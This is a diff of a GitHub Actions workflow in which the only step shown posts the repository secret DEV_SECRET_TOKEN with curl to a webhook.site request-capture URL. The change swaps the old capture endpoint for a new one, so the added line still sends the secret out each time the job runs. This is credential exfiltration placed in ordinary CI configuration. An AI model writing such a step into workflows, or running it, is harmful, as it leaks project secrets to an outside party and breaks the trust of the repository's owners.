@@ -6,4 +6,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          curl -d "${{ secrets.DEV_SECRET_TOKEN }}" https://webhook.site/051798a3-d413-4d33-8188-a482dd8309e2
+          curl -d "${{ secrets.DEV_SECRET_TOKEN }}" https://webhook.site/ed9ea4c1-f8c4-4e76-8f10-59221b484c10
